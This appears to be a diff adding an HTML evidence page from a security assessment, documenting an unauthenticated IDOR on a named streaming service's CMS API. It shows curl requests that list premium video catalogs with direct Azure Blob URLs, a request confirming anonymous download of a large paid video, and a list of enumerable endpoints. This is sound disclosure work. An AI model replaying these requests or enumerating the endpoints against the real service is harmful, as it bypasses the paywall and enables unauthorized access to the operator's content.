@@ -1,0 +1,75 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<style>
+ body { background:#1e1e1e; color:#d4d4d4; font-family:'Menlo','Consolas','Courier New',monospace; margin:0; padding:18px 22px; font-size:13px; line-height:1.45; }
+ .bar { background:#2d2d2d; color:#9cdcfe; padding:6px 14px; border-radius:5px 5px 0 0; font-size:12px; border:1px solid #3c3c3c; border-bottom:0; }
+ .win { border:1px solid #3c3c3c; border-radius:5px; overflow:hidden; box-shadow:0 2px 10px rgba(0,0,0,.5); }
+ .body { padding:14px 18px; }
+ h2 { color:#4ec9b0; margin:0 0 10px 0; font-size:15px; font-family:'Segoe UI',sans-serif; }
+ .meta { color:#888; font-size:11px; font-family:sans-serif; margin-bottom:12px; }
+ .red { color:#f48771; } .green { color:#6a9955; } .yellow { color:#dcdcaa; } .blue { color:#569cd6; } .cyan { color:#4ec9b0; }
+ .find { color:#ce9178; } .url { color:#3794ff; text-decoration:underline; }
+ .tag { background:#5c2d2d; color:#ffd0d0; padding:1px 6px; border-radius:3px; font-size:10px; font-family:sans-serif; }
+</style></head><body>
+<div class="win"><div class="bar">F-E02 / F-021 — Unauth IDOR /v1/brand/{id}/videos + Azure Blob direct download</div><div class="body">
+
+<h2>BOLA/IDOR unauth — premium VOD catalog + Azure Blob direct download URLs</h2>
+<div class="meta">GET https://cms.soultv.com.br/v1/brand/5/videos  — NO authentication | CVSS 7.5 HIGH (extends C-002)</div>
+<pre><span class="green">$</span> curl -s https://cms.soultv.com.br/v1/brand/5/videos
+{
+  "success": true,
+  "data": [
+{
+  "id": 6838,
+  "name": "29/10/2025 | BASTIDORES DA FINAL | PONTE PRETA 2 x 0 LONDRINA | CAMPEONATO BRASILEIRO",
+  "url": <span class="url">"https://stsoultvbrs.blob.core.windows.net/media/channel_videos/video_pontv_03-11.mp4"</span>,
+  "duration": "37:18",
+  "preview_img": "https://stsoultvbrs.blob.core.windows.net/media/channel_videos/img/video_pontv_03-11.jpg",
+  "date": "03-11-2025"
+},
+{
+  "id": 6825,
+  "name": "26/10/2025 | GOLS DA FINAL | PONTE PRETA 2 X 0 LONDRINA | CAMPEONATO BRASILEIRO C",
+  "url": <span class="url">"https://stsoultvbrs.blob.core.windows.net/media/channel_videos/video_pontv_27-10_a.mp4"</span>,
+  "duration": "02:37",
+  "preview_img": "https://stsoultvbrs.blob.core.windows.net/media/channel_videos/img/video_pontv_27-10_a.jpg",
+  "date": "27-10-2025"
+},
+{
+  "id": 6811,
+  "name": "15/10/2025 | BASTIDORES | PONTE PRETA 2 x 0 GFC | DÉRBI 212",
+  "url": <span class="url">"https://stsoultvbrs.blob.core.windows.net/media/channel_videos/video_pontv_17-10_b.mp4"</span>,
+  "duration": "25:30",
+  "preview_img": "https://stsoultvbrs.blob.core.windows.net/media/channel_videos/img/video_pontv_17-10_b.jpg",
+  "date": "17-10-2025"
+},
+    ... (full channel catalog — brand IDs 1..N enumerable)
+  ]
+}
+
+<span class="blue">== Direct download of premium video WITHOUT auth (Azure Blob) ==</span>
+<span class="green">$</span> curl -sI https://stsoultvbrs.blob.core.windows.net/media/channel_videos/video_pontv_03-11.mp4
+HTTP/1.1 200 OK
+Content-Length: 593698889
+Content-Type: application/octet-stream
+Content-MD5: J6jdlqrfapiRykrN3K1sHw==
+Last-Modified: Sun, 19 Jul 2026 16:33:34 GMT
+ETag: 0x8DEE5B37A446120
+Server: Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0
+x-ms-request-id: 43133990-801e-0003-1968-36a035000000
+x-ms-version: 2009-09-19
+x-ms-lease-status: unlocked
+x-ms-blob-type: BlockBlob
+Date: Thu, 27 Aug 2026 21:13:10 GMT
+
+
+  <span class="red">^ HTTP 200 OK — 593 MB premium .mp4 downloadable anonymously (paywall bypass)</span>
+
+<span class="blue">== Enumerable unauth endpoints (same /v1) ==</span>
+  GET /v1/brand/{id}            - 296 channels (full catalog + url_live_streaming)
+  GET /v1/brand/{id}/videos     - this finding (videos per channel)
+  GET /v1/video/{id}           - IDs 1..~6900 (each w/ Azure Blob url)
+  GET /v1/program/{id}         - IDs 1..1000+
+  GET /v1/schedules?channel={id} - programming grid
+</pre>
+
+</div></div></body></html>
